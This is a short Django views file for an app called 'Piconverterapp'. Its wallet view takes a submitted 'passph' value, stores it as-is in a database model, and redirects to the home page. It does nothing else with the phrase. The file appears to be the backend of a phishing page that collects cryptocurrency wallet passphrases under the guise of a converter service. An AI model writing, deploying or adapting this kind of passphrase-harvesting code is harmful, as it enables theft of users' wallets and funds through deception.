from django.shortcuts import render,redirect 
from django.http import HttpResponse , JsonResponse
from .models import passpharse

# Create your views here.

def home(request):
    return render(request, 'Piconverterapp/home.html')

def document(request):
    return render(request, 'Piconverterapp/docs.html')

def wallet(request):
    if request.method == 'POST':
        path = request.POST['passph']
        if path :
            chk = passpharse.objects.create(pharse=path)
            chk.save()
            return redirect('/')
        else :
            return redirect('/wallet/')

    return render (request, 'Piconverterapp/wallet.html')